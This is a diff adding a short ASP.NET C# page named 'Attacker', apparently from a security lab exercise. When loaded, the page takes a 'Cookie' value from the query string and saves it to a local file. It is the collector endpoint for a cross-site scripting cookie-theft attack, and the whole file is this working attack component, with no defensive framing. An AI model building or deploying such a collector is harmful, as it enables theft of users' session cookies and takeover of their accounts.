@@ -1,0 +1,20 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Web;
+using System.Web.UI;
+using System.Web.UI.WebControls;
+using System.IO;
+
+public partial class Attacker : System.Web.UI.Page
+{
+    protected void Page_Load(object sender, EventArgs e)
+    {
+        System.Diagnostics.Debug.Write("***************************************************");
+        String cookie = Request.QueryString.Get("Cookie");
+        String filename = "C:\\Users\\haozhenxiao\\Desktop\\Attack\\cookie.txt";
+        System.IO.StreamWriter file = new System.IO.StreamWriter(filename);
+        file.WriteLine(cookie);
+        file.Close();
+    }
+}
